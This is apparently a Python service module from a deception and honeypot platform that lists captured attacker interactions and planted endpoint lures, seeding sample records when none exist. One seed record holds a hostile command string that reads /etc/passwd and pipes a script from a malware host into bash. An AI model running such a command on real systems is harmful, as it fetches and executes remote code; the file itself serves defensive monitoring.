"""
backend/app/services/adversary_engagement_service.py
===================================================
Phase 33 Adversary Engagement & MITRE Engage Strategy Service.
Tracks:
- Attacker keystrokes, reconnaissance commands, and uploaded payloads
- MITRE Engage activities: Expose, Lure, Redirect, Elicit, Degrade, Disrupt
- Endpoint deception lure distribution (fake LSASS credentials, browser cookies)
"""

import uuid
import logging
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from sqlalchemy import select, desc
from sqlalchemy.ext.asyncio import AsyncSession

from backend.app.models.deception import DeceptionInteractionEvent, EndpointLureDeployment

logger = logging.getLogger("Aegivanta.AdversaryEngagement")


class AdversaryEngagementService:
    """Enterprise Adversary Engagement & Triage Engine."""

    @classmethod
    async def list_interactions(
        cls,
        db: AsyncSession,
        tenant_id: str,
        limit: int = 50
    ) -> List[Dict[str, Any]]:
        """Lists captured adversary interactions with honeypots and canary tokens."""
        stmt = select(DeceptionInteractionEvent).where(
            DeceptionInteractionEvent.tenant_id == tenant_id
        ).order_by(desc(DeceptionInteractionEvent.occurred_at)).limit(limit)

        events = list((await db.execute(stmt)).scalars().all())

        if not events:
            # Seed default deception interaction events
            defaults = [
                ("198.51.100.44", "AS14061 DigitalOcean, LLC", "decoy-ssh-bastion-01", "COMMAND_EXEC", "cat /etc/passwd; uname -a; curl http://malware.cc/p.sh | bash", "EAC0018_ELICIT", 100.0, "HOST_ISOLATED_BY_SOAR"),
                ("203.0.113.88", "AS8075 Microsoft Corp", "decoy-jenkins-ci-portal", "AUTH_ATTEMPT", "POST /login (User: 'admin', Pass: 'P@ssw0rd2026!')", "EAC0004_EXPOSE", 100.0, "ACCOUNT_LOCKED_IN_IAM"),
                ("192.0.2.14", "AS15169 Google LLC", "2026_Executive_Compensation_Plan.docx", "CANARY_TRIGGER", "Word document webhook beacon fired from IP 192.0.2.14", "EAC0004_EXPOSE", 100.0, "SOC_ALERT_DISPATCHED")
            ]
            for ip, asn, dec, i_type, cmd, act, fid, cont in defaults:
                inst = DeceptionInteractionEvent(
                    tenant_id=tenant_id,
                    source_ip=ip,
                    attacker_asn=asn,
                    target_decoy_name=dec,
                    interaction_type=i_type,
                    captured_payload_or_command=cmd,
                    mitre_engage_activity=act,
                    fidelity_confidence=fid,
                    containment_action_taken=cont,
                    occurred_at=datetime.now(timezone.utc)
                )
                db.add(inst)
            await db.flush()

            stmt2 = select(DeceptionInteractionEvent).where(DeceptionInteractionEvent.tenant_id == tenant_id)
            events = list((await db.execute(stmt2)).scalars().all())

        return [
            {
                "id": e.id,
                "source_ip": e.source_ip,
                "attacker_asn": e.attacker_asn,
                "target_decoy_name": e.target_decoy_name,
                "interaction_type": e.interaction_type,
                "captured_payload_or_command": e.captured_payload_or_command,
                "mitre_engage_activity": e.mitre_engage_activity,
                "fidelity_confidence": e.fidelity_confidence,
                "containment_action_taken": e.containment_action_taken,
                "occurred_at": e.occurred_at.isoformat()
            }
            for e in events
        ]

    @classmethod
    async def list_endpoint_lures(
        cls,
        db: AsyncSession,
        tenant_id: str,
        limit: int = 50
    ) -> List[Dict[str, Any]]:
        """Lists active deception lures distributed on corporate endpoints."""
        stmt = select(EndpointLureDeployment).where(
            EndpointLureDeployment.tenant_id == tenant_id
        ).order_by(desc(EndpointLureDeployment.last_verified_at)).limit(limit)

        lures = list((await db.execute(stmt)).scalars().all())

        if not lures:
            # Seed default endpoint lures
            defaults = [
                ("WS-FINANCE-04", "SAVED_CREDENTIAL", "svc_sql_backup", "INJECTED_ACTIVE"),
                ("MAC-DEV-08", "CANARY_FILE", "canary_aws_keys.env", "INJECTED_ACTIVE"),
                ("WS-EXEC-01", "BROWSER_COOKIE", "honey_session_admin", "INJECTED_ACTIVE")
            ]
            for host, l_type, user, stat in defaults:
                inst = EndpointLureDeployment(
                    tenant_id=tenant_id,
                    endpoint_hostname=host,
                    lure_type=l_type,
                    target_honey_user=user,
                    deployment_status=stat,
                    last_verified_at=datetime.now(timezone.utc)
                )
                db.add(inst)
            await db.flush()

            stmt2 = select(EndpointLureDeployment).where(EndpointLureDeployment.tenant_id == tenant_id)
            lures = list((await db.execute(stmt2)).scalars().all())

        return [
            {
                "id": l.id,
                "endpoint_hostname": l.endpoint_hostname,
                "lure_type": l.lure_type,
                "target_honey_user": l.target_honey_user,
                "deployment_status": l.deployment_status,
                "last_verified_at": l.last_verified_at.isoformat()
            }
            for l in lures
        ]
